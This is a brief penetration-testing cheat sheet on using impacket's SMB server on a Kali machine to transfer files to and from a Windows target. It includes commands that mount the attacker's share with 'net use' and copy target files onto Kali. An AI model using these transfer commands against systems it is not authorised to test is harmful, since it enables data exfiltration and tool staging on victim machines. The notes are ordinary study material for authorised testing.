# SMB

Serve:
```
python /usr/share/doc/python-impacket/examples/smbserver.py share-name root-dir
```



On the target, you can view the available shares on the SMB server with net view `\\ip-addr`.
To view the files available in the share, simply use dir `\\ip-addr\share-name`


To actually download a file, use `copy \\ip-addr\share-name\file out-file`













You can launch an SMB share on your Kali machine with impacket
```
impacket-smbserver [SHARE NAME] [SHARE FOLDER] -smb2support -username User -password [PASS]

impacket-smbserver [SHARE NAME] /usr/share/windows-binaries/

impacket-smbserver [SHARE NAME] [SHARE FOLDER] -smb2support
```


#### Example 1
```
# start a share in kali
impacket-smbserver myShare . -smb2support -username stephanie -password 'P@ssword!'

# Then mount this share on the windows machine with:
net use X: \\[IP]\[SHARE NAME]
net use m: \\[IP]\[SHARE NAME] /user:[USERNAME] [PASSWORD]
net use m: \\Kali_IP\test /user:kourosh kourosh

# to delete share
net use X: /delete

```

After that it's really easy because you can just copy/paste things from the windiws target and have it on your Kali.




#### Example 2 (may not work)
```
impacket-smbserver share /home/[USERNAME]/Desktop -smb2support


# On target machine open File Explorer an in the searchbar put:
\\[ATTACKER IP]


```


